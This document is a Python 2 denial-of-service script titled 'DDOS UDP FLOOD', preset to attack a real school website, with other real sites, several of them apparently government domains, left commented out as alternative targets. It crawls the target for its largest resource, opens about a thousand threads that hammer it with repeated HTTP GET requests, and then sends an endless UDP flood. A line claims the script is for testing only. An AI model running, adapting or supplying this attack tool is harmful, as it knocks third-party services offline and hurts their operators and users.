# -*- coding: cp936 -*-
from socket import socket,AF_INET,SOCK_STREAM,SOCK_DGRAM
from random import choice
from os import popen,system
from sys import argv,exit
from time import sleep
import threading
import urllib
import urllib2
import re


print 'DDOS UDP FLOOD'
print 'Author: Sen'
print 'QQ: 1020205973'
print '此程序仅供测试使用，下载后请在24小时内删除，严禁用于非法用途，否则后果自负！'
print 'For personal test/study use only. Any commercial or illegal use is prohibited'


#HOST = 'www.rizhao.gov.cn'
#HOST = 'www.rzjy.gov.cn'
HOST = 'www.rzyz.org.cn'
#HOST = 'www.rgex.net'
#HOST = 'www.baidu.com'
#HOST = 'mail.rzyz.org.cn'
#HOST = 'www.pigai.org'

Stop = False
IP = ''
ZERO = 0
BUFSIZ = 10240000
PORT = 80
ADDR = (HOST,PORT)
Time_List = ['0.5','1','1.5','2','2.5','3','3.5','4']
Count = False
Time_Out = False
Check_Wait = False
Range = 1000
List_Image = []
Get_Length_Max_Path_Times = 0
Get_Length_Max_Path_Times_check = 0
Length_Max = 0
Length_Max_Path = ''

for i in popen('ping -a -n 1 -l 1 %s' %HOST):
    try:
        if 'Ping' in i:
            IP = i.split('[')[1].split(']')[0]
            break
    except:
        pass



def Get_Length_Max_Path(HTML):
    
    global Length_Max,Length_Max_Path,Get_Length_Max_Path_Times,List_Image

    pattern = re.compile('<img src="(.*?)"')
    result = re.findall(pattern,HTML)
    if len(result) > 0:
        for DDOS_PATH in result:
            if DDOS_PATH not in List_Image:
                List_Image.append(DDOS_PATH)
                try:
                    f = urllib.urlopen('http://' + HOST + i)
                    firstLine = f.read()
                    Length = len(firstLine)
                    if Length > Length_Max:
                        Length_Max = Length
                        Length_Max_Path = DDOS_PATH
                        print Length_Max
                        print Length_Max_Path
                except:
                    pass

    Get_Length_Max_Path_Times += 1


def TCP_Connect(HOST,PORT,CC):
    global Count,ZERO,Time_List

    tcpCliSock = socket(AF_INET, SOCK_STREAM)
    ADDR = (HOST,PORT)
    
    try:
        tcpCliSock.connect(ADDR)
    except:
        pass
        sleep(float(choice(Time_List)))
        while True:
            try:
                tcpCliSock.connect(ADDR)
                break
            except:
                pass


    while True:
        if Count == True:
            break
        sleep(0.2)

    if ZERO == 'While':
        while True:
            try:
                tcpCliSock.send(CC)
            except:
                tcpCliSock.close()
                tcpCliSock = socket(AF_INET, SOCK_STREAM)
                while True:
                    try:
                        tcpCliSock.connect(ADDR)
                        break
                    except:
                        pass
    else:
        while True:
            for i in range(ZERO):
                try:
                    tcpCliSock.send(CC)
                except:
                    pass
            tcpCliSock.close()
            tcpCliSock = socket(AF_INET, SOCK_STREAM)
            while True:
                try:
                    tcpCliSock.connect(ADDR)
                    break
                except:
                    pass

def Check_Time_Out():
    global Time_Out,Check_Wait,ZERO,Stop
    sleep(90)
    if Check_Wait == False:
        Stop = True
        ZERO = 'While'
        Main()


def Main():
    global ZERO,Count,HOST,PORT,CC
    print '~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print ZERO

    raw_input('------------------\nPress any button to start attack>>')

    Thread_Check = 0
    for i in range(Range):
        try:
            Connect_thread = threading.Thread(target=TCP_Connect,args=(HOST,PORT,CC,))
            Connect_thread.start()
            Thread_Check += 1
        except:
            pass
    print 'Lines： %d' %Thread_Check


    sleep(1)
    Count = True

    Trojan = 'Hacked!'
    udpCliSock = socket(AF_INET, SOCK_DGRAM)

    print '-----------------------------'
    print 'Start Attack!'

    while True:
        udpCliSock.sendto(Trojan,ADDR)



    
f = urllib.urlopen('http://' + HOST)
firstLine = f.read()

RE_HTML = re.compile(' href="(.*?)"')
List_HTML = re.findall(RE_HTML,firstLine)
List_HTML = list(set(List_HTML))

for i in List_HTML:
    if 'http:' in i:
        List_HTML.remove(i)
    elif '#' in i:
        List_HTML.remove(i)

try:
    Get_Length_Max_Path_Thread = threading.Thread(target=Get_Length_Max_Path,args=(firstLine,))
    Get_Length_Max_Path_Thread.start()
    Get_Length_Max_Path_Times_check += 1
except:
    pass
    
for i in List_HTML:
    print i
    try:
        f = urllib.urlopen('http://' + HOST + i)
        firstLine = f.read()
        Get_Length_Max_Path_Thread = threading.Thread(target=Get_Length_Max_Path,args=(firstLine,))
        Get_Length_Max_Path_Thread.start()
        Get_Length_Max_Path_Times_check += 1
    except:
        pass


while True:
    if Get_Length_Max_Path_Times == Get_Length_Max_Path_Times_check:
        break
    sleep(0.2)

system('cls')
if Length_Max == 0:
    Length_Max_Path = '/'
    tcpCliSock = socket(AF_INET, SOCK_STREAM)
    tcpCliSock.connect(ADDR)
    tcpCliSock.send('GET / HTTP/1.1\r\nHost:\r\n\r\n')
    date = tcpCliSock.recv(BUFSIZ)
    tcpCliSock.close()
    Length_Max = len(date)

CC = 'GET %s HTTP/1.1\nHost:%s\r\n\r\n' %(Length_Max_Path,HOST)

print '~~~~~~~~~~~~~~~~~~~~~~~~~~~'
print 'Max Size: ' + str(Length_Max)
print 'Repository: ' + str(Length_Max_Path)
print 'Webpage： %s(%s)' %(HOST,IP)

tcpCliSock = socket(AF_INET, SOCK_STREAM)
tcpCliSock.connect(ADDR)

Check_Time_Out_thread = threading.Thread(target=Check_Time_Out,args=())
Check_Time_Out_thread.start()

while True:
    ZERO += 1
    try:
        tcpCliSock.send(CC)
        date = tcpCliSock.recv(BUFSIZ)
    except:
        if Stop == False:
            Check_Wait = True
            ZERO = 'While'
            Main()
            break
    if len(date) == 0:
        if Stop == False:
            Check_Wait = True
            Main()
            break

























        
